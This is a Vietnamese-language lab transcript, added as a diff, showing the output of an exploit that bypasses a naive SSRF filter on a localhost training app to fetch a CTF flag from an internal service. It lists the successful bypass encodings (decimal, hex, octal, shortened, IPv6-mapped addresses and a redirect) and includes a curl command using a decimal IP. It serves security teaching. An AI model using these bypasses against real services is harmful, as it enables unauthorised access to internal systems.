@@ -1,0 +1,28 @@
+# Transcript lab 6.2 - Vuot filter SSRF
+# App chinh: 127.0.0.1:8057 (python3 app.py) - co filter ngay tho
+# Dich vu noi bo: 127.0.0.1:8058 (python3 internal_service.py)
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:27:44
+# ============================================================
+
+[*] Buoc 0: thu URL noi bo that tha (phai bi filter chan):
+    [403] {'blocked': True, 'error': 'URL tro toi noi bo, bi chan', 'ok': False, 'url': 'http://127.0.0.1:8058/admin/secret'}
+
+[*] Vuot filter bang cac bieu dien host khac nhau:
+    thap phan (decimal)      [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+    hex                      [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+    octal                    [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+    rut gon 127.1            [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+    host '0' (=0.0.0.0)      [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+    userinfo @ + decimal     [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+    IPv6-mapped hex          [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+
+[*] Vuot bang redirect 302 (filter khong kiem lai dich redirect):
+    redirect qua /bounce  [200] FLAG=FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+
+[+] Da vuot filter, cham dich noi bo. FLAG = FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}
+
+# --- Minh hoa them bang curl (decimal IP vuot filter) ---
+$ curl -s 'localhost:8057/fetch?url=http://2130706433:8058/admin/secret'
+{"body":"{\"flag\":\"FLAG{6.2_vuot_filter_ssrf_toi_noi_bo}\",\"service\":\"internal-only\"}\n","ok":true,"status":200,"url":"http://2130706433:8058/admin/secret"}
+
